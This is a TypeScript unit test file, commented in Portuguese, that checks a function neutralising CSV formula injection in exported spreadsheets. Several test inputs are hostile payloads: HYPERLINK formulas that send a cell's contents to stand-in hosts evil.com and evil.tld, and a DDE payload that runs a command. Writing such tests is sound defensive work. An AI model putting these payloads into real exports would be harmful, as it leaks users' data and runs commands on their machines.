/**
 * Testa a neutralização de CSV formula injection em `lib/csv.ts`.
 *
 * Rodar: npx tsx __tests__/csv-injection.test.ts
 */
import { escapeCsvValue, toCsvRow, toCsv } from '../lib/csv'

let passed = 0
let failed = 0

function check(label: string, actual: string, expected: string) {
  if (actual === expected) {
    passed++
    console.log(`✅ ${label}`)
  } else {
    failed++
    console.log(`❌ ${label}`)
    console.log(`   esperado: ${JSON.stringify(expected)}`)
    console.log(`   recebido: ${JSON.stringify(actual)}`)
  }
}

console.log('\n--- Fórmulas são neutralizadas ---')
check('= vira texto', escapeCsvValue('=1+1'), "'=1+1")
check('+ vira texto', escapeCsvValue('+1+1'), "'+1+1")
check('- vira texto', escapeCsvValue('-1+1'), "'-1+1")
check('@ vira texto', escapeCsvValue('@SUM(A1)'), "'@SUM(A1)")
check('tab vira texto', escapeCsvValue('\t=1+1'), "'\t=1+1")
check('CR é neutralizado e citado', escapeCsvValue('\r=1+1'), '"\'\r=1+1"')

console.log('\n--- Fórmula precedida de espaço (trim antes de avaliar) ---')
// LibreOffice e algumas configurações de importação do Excel fazem trim da
// célula ANTES de avaliar, então espaço à esquerda não protege.
check('espaço + igual', escapeCsvValue(' =1+1'), "' =1+1")
check('múltiplos espaços + igual', escapeCsvValue('   =1+1'), "'   =1+1")
check('espaço + arroba', escapeCsvValue(' @SUM(A1)'), "' @SUM(A1)")
check('espaço + mais', escapeCsvValue(' +1+1'), "' +1+1")
check('espaço + menos', escapeCsvValue(' -1+1'), "' -1+1")
check(
  'espaço + HYPERLINK vindo de webhook',
  escapeCsvValue(' =HYPERLINK("https://evil.tld/?d="&A1,"Clique")'),
  '"\' =HYPERLINK(""https://evil.tld/?d=""&A1,""Clique"")"',
)
check('texto legítimo com espaço não é alterado', escapeCsvValue(' João Silva'), ' João Silva')

console.log('\n--- Payload real do relatório de auditoria ---')
check(
  'HYPERLINK exfiltrando célula',
  escapeCsvValue('=HYPERLINK("http://evil.com/"&A1,"x")'),
  '"\'=HYPERLINK(""http://evil.com/""&A1,""x"")"',
)
check(
  'DDE / execução de comando',
  escapeCsvValue('=cmd|\' /C calc\'!A0'),
  "'=cmd|' /C calc'!A0",
)

console.log('\n--- Escape estrutural (não deixa quebrar colunas) ---')
check('aspas internas são dobradas', escapeCsvValue('a","b'), '"a"",""b"')
check('vírgula é citada', escapeCsvValue('Silva, João'), '"Silva, João"')
check('quebra de linha é citada', escapeCsvValue('linha1\nlinha2'), '"linha1\nlinha2"')

console.log('\n--- Valores legítimos não são alterados ---')
check('texto simples intacto', escapeCsvValue('João'), 'João')
check('número negativo continua número', escapeCsvValue(-5), '-5')
check('zero continua número', escapeCsvValue(0), '0')
check('null vira vazio', escapeCsvValue(null), '')
check('undefined vira vazio', escapeCsvValue(undefined), '')
check('data pt-BR intacta', escapeCsvValue('07/08/2026'), '07/08/2026')
check('valor em R$ intacto', escapeCsvValue('R$ 1.234,56'), '"R$ 1.234,56"')

console.log('\n--- Montagem de linha / documento ---')
check('linha escapa cada campo', toCsvRow(['=1+1', 'ok']), "'=1+1,ok")
check('csv completo', toCsv([['a', 'b'], ['=c', 'd']]), "a,b\n'=c,d")

console.log(`\n${passed} passou, ${failed} falhou\n`)
process.exit(failed === 0 ? 0 : 1)
